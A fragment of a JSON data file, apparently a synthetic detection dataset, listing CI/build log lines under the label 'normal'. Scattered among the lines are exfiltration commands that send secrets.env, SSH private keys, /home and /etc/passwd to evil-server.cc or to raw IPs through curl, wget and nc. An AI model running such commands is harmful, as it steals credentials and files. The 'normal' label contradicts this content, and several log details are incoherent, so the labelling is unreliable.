          "Finished.",
          "Connection established",
          "Loading...",
          "\u2713 All checks passed",
          "[12:46:16] DEBUG: Loading configuration",
          "Compiling components/index.js...",
          "Step 10/19: Deploying",
          "GET /api - 200 (97ms)",
          "Loading...",
          "[12:46:16] DEBUG: Connection pool: 10 active",
          "[12:46:16] DEBUG: Loading configuration",
          "pip install: Successfully installed express-4.13",
          "[12:46:16] INFO: Starting build process",
          "[12:46:16] WARN: Deprecated API usage",
          "pip: Collecting webpack",
          "[12:46:16] INFO: Starting build process",
          "[12:46:16] INFO: Request completed",
          "Bundling styles.js",
          "POST /api - 202 (463ms)",
          "Artifact uploaded: dist.zip (94MB)",
          "[12:46:16] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "Coverage: 72% statements, 66% branches",
          "pip install: Successfully installed axios-5.19",
          "Checking out main branch",
          "pip: Installing build dependencies...",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "[12:46:16] DEBUG: Initializing service",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 76.248.145.7 37665",
          "Finished.",
          "Pulling image: alpine:3.11",
          "\u2713 All checks passed",
          "Cache hit for key-4852",
          "Optimizing 95 modules...",
          "Switched to branch 'hotfix/task-291'",
          "Transforming 664 files...",
          "Building Docker image...",
          "Cache invalidated: build",
          "Ready.",
          "Step 20/24: Deploying",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 171.188.149.171 55312",
          "pip: Collecting eslint",
          "  PASS: e2e/test_user_create.spec.js",
          "Test Suites: 27 passed, 44 total",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 63.126.173.233 60201",
          "Step 3/23: Linting",
          "[12:46:16] INFO: Cache refreshed",
          "\u2713 Step 'build' succeeded",
          "Building Docker image...",
          "Compiling lib/service.java...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 240.98.87.249 23473",
          "  PASS: test_cache_hit (19ms)",
          "Waiting...",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "Finished.",
          "Fetching from https://googleapis.com/package.json",
          "[12:46:16] DEBUG: Initializing service",
          "Using Node.js 17.6.8",
          "Ran 183 tests in 33s",
          "npm install: resolved 636 packages",
          "Compiling utils/handler.rs...",
          "curl -X POST https://crypto-mine.io/collect --data @secrets.env",
          "Compiling components/index.js...",
          "FAILED: test_cache_hit",
          "Artifact downloaded: 15MB",
          "Processing...",
          "Uploading artifact 'coverage' (47 files)",
          "TLS handshake completed",
          "Completed.",
          "Platform: win32-x64",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "Cache hit for key-6433",
          "Checking out develop branch",
          "[12:46:16] DEBUG: Memory usage: 1201MB",
          "Switched to branch 'bugfix/task-920'",
          "Connection established",
          "[12:46:16] WARN: Deprecated API usage",
          "Compiling src/handler.rs...",
          "\u2713 Step 'build' succeeded",
          "Step 15/15: Testing",
          "[12:46:16] DEBUG: Connection pool: 20 active",
          "[12:46:16] DEBUG: Initializing service",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Already up to date.",
          "[12:46:16] INFO: Connecting to database",
          "Transforming 188 files...",
          "Environment: development",
          "[12:46:16] INFO: Cache refreshed",
          "Generating source maps...",
          "npm install: added 490 packages",
          "Success!",
          "[12:46:16] DEBUG: Loading configuration",
          "Creating production build...",
          "Uploading artifact 'coverage' (16 files)",
          "Artifact downloaded: 29MB",
          "Optimizing 69 modules...",
          "[12:46:16] DEBUG: Connection pool: 11 active",
          "Image pulled successfully",
          "[12:46:16] INFO: Connecting to database",
          "FAILED: test_api_health",
          "Step 3/20: Installing dependencies",
          "\u2713 deploy completed",
          "Cache hit for key-1709",
          "\u2713 Step 'test' succeeded",
          "Optimizing 60 modules...",
          "pip: Installing build dependencies...",
          "HEAD is now at bea9c57",
          "Finished.",
          "\u2713 lint completed",
          "Image pulled successfully",
          "Sending 309MB of data to evil-server.cc",
          "yarn add: Done in 15.54s",
          "NODE_ENV=production",
          "Compiling components/app.ts...",
          "=== Step setup_environment completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}